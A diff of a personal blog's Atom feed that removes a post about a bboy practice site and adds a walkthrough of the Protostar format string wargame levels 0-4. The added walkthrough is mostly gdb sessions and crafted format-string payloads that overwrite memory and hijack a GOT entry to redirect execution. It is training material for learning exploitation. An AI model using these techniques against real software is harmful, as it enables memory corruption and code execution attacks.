@@ -4,7 +4,7 @@
   <title><![CDATA[Category: projects | Louis Li]]></title>
   <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2018-06-21T15:41:26+05:30</updated>
+  <updated>2018-06-21T15:51:52+05:30</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -12,30 +12,6 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
-  
-  <entry>
-    <title type="html"><![CDATA[Bboy Practices]]></title>
-    <link href="http://louisrli.github.io/blog/2015/12/06/bboy-practices/"/>
-    <updated>2015-12-06 00:00:00 +0530</updated>
-    <id>http://louisrli.github.io/blog/2015/12/06/bboy-practices</id>
-    <content type="html"><![CDATA[<p><a href="http://bboypractices.com">bboypractices</a> is live: a site for traveling bboys to find bboy practices. </p>
-
-<p>I’ll let the site speak for itself – a good site shouldn’t require a long blog post as an
-explanation.</p>
-
-<!-- more -->
-<p>The motivation behind the site can be found under the <em>About</em> page at 
-<a href="http://bboypractices.com">http://bboypractices.com</a>. Briefly, there was a lot of manual labor
-involved in finding practices while I was traveling – reaching out to friends of friends of
-friends. I’d like to keep the human element of finding bboy practices while enabling people to find
-practice spots.</p>
-
-<p>In related news, this is my first major release of a personal project. This was my first time
-hooking up a domain and setting up a site via EC2 (running on my student credits). Thanks to everybody who
-tested the site beforehand: Harvard Breakers and Weirdside. Particular thanks to my brother for his
-constant testing and feedback.</p>
-]]></content>
-  </entry>
   
   <entry>
     <title type="html"><![CDATA[Senior Thesis: Security Analysis of Java Web Applications Using String Constraint Analysis]]></title>
@@ -225,6 +201,178 @@ injection and cross-site scripting.</p>
   <dt>Links</dt>
   <dd><a href="https://github.com/louisrli/louisrli.github.com">source code</a>, <a href="http://louisrli.github.com/">site</a></dd>
 </dl>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
+    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
+    <updated>2012-08-29 00:00:00 +0530</updated>
+    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
+    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Format: Level 0
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>ef<span class="se">\x</span>be<span class="se">\x</span>ad<span class="se">\x</span>de”’<span class="k">)</span>&lt;/p&gt;
+
+<span class="go">&lt;p&gt;you have hit the target correctly :)</span></code></pre></div></p>
+
+<!-- more -->
+<p>## Format: Level 1
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>
+
+<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
+<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div></p>
+
+<p>Next, we need to find where the format function expects the first (missing) argument to the format string.
+<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98f “AAAA%08x”) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/10xw $esp
+0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
+0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
+0xbffff788:     0xbffff7b8      0x08048469
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c
+(gdb) p 0xbffff98f - 0x0bffff784
+$1 = 523</code></pre></div></p>
+
+<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>
+
+<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y&lt;/p&gt;
+
+&lt;p&gt;Starting program: /opt/protostar/bin/format1 AAAAA%08x&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98e “AAAAA%08x”) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c</code></pre></div></p>
+
+<ul>
+  <li><code>0xbffff784</code>: The first argument to the format string.</li>
+  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
+</ul>
+
+<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>
+
+<p>With a few calculations, we can find the correct offset.
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>38<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’..%128<span class="nv">$n</span>’
+<span class="go">8..you have modified the target :)</span></code></pre></div></p>
+
+<h2 id="format-level-2">Format: Level 2</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
+<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div></p>
+
+<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%4<span class="nv">$08x</span> <span class="p">|</span> ./format2
+<span class="go">080496e4target is 0 :(</span></code></pre></div></p>
+
+<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%60u%4<span class="nv">$n</span> <span class="p">|</span> ./format2
+<span class="go">                                                         512you have modified the target :)</span></code></pre></div></p>
+
+<h2 id="format-level-3">Format: Level 3</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format3 <span class="p">|</span> grep target
+<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div></p>
+
+<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
+Breakpoint 1 at 0x804837c
+(gdb) run
+Starting program: /opt/protostar/bin/format3
+AAAA
+Breakpoint 1, __printf (format=0xbffff5a0 “AAAA\n”) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff570:
+eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
+called by frame at 0xbffff590
+source language c.
+Arglist at 0xbffff568, args: format=0xbffff5a0 “AAAA\n”
+Locals at 0xbffff568, Previous frame’s sp is 0xbffff570
+Saved registers:
+ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
+(gdb) x/3xw 0xbffff568
+0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
+(gdb) x/w 0xbffff570
+0xbffff570:     0xbffff5a0
+(gdb) p 0xbffff5a0 - 0xbffff570
+= 48</code></pre></div></p>
+
+<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="nv">$x</span> <span class="p">|</span> ./format3
+<span class="go">AAAA41414141</span>
+<span class="go">target is 00000000 :(</span></code></pre></div></p>
+
+<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 44” <span class="p">|</span> bc
+<span class="go">68</span>
+<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 55” <span class="p">|</span> bc
+<span class="go">85</span>
+<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 02” <span class="p">|</span> bc
+<span class="go">2</span>
+<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 01” <span class="p">|</span> bc
+<span class="go">1</span></code></pre></div></p>
+
+<p>Finally, we write values to each of the four bytes of <code>target</code>:
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>f4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f5<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f6<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f7<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%52u%12<span class="nv">$n</span>%’‘17u%13<span class="nv">$n</span>’‘%173u%14<span class="nv">$n</span>’ <span class="p">|</span> ./format3
+<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796</span>
+<span class="go">you have modified the target :))</span></code></pre></div></p>
+
+<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>
+
+<h2 id="format-level-4">Format: Level 4</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>
+
+<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> ‘AAAA%4<span class="nv">$x</span>’ <span class="p">|</span> ./format4
+<span class="go">AAAA41414141</span></code></pre></div></p>
+
+<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
+<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt; 00000000  GLIBC_2.0   _exit</span>
+<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt;  00000000  GLIBC_2.0   exit</span>
+<span class="go">08049718 R_386_JUMP_SLOT   _exit</span>
+<span class="go">08049724 R_386_JUMP_SLOT   exit</span>
+<span class="gp">$</span> objdump -t format4 <span class="p">|</span> grep hello
+<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div></p>
+
+<p>To confirm that our overwrite works correctly, we run a quick test:
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%4<span class="nv">$n</span>’ <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/format4
+<span class="gp">$</span> gdb -q format4
+<span class="go">Reading symbols from /opt/protostar/bin/format4…done.</span>
+<span class="go">(gdb) run &amp;lt; /tmp/format4</span>
+<span class="go">Starting program: /opt/protostar/bin/format4 &amp;lt; /tmp/format4</span>
+<span class="gp">$</span>�
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x00000004 in ?? ()</span></code></pre></div></p>
+
+<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%33968u%4<span class="nv">$hn</span>’ <span class="p">|</span> ./format4
+<span class="gp">$</span>
+<span class="go">&lt;lots of=&quot;&quot; whitespace=&quot;&quot;&gt;</span>
+<span class="go">512</span>
+<span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div></lots></p>
 ]]></content>
   </entry>
   
